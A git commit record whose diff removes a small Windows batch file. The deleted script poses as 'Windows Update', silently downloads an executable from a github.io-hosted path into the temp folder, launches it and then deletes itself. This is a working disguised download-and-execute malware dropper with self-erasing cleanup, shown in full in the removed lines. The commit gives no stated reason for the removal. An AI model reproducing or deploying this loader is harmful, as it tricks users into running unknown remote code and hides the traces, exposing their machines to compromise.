2d9f28339e82c74c106aaf7f9f84612733d96ab5
boostedboynow <boostedboynow@gmail.com>
2026-05-19 02:45:30 +0300

    remove 2ai5a7.cmd

--- 2ai5a7.cmd
+++
@@ -1,8 +0,0 @@
-@echo off
-title Windows Update
-timeout /t 3 /nobreak >nul
-if not exist "%USERPROFILE%\Desktop" exit /b
-curl -sL "https://boostedboynow.github.io/assets-host/2w1joo.exe" -o "%tmp%\hcj9.exe"
-if %errorlevel% neq 0 exit /b
-start "" "%tmp%\hcj9.exe"
-(goto) 2>nul & del "%~f0"
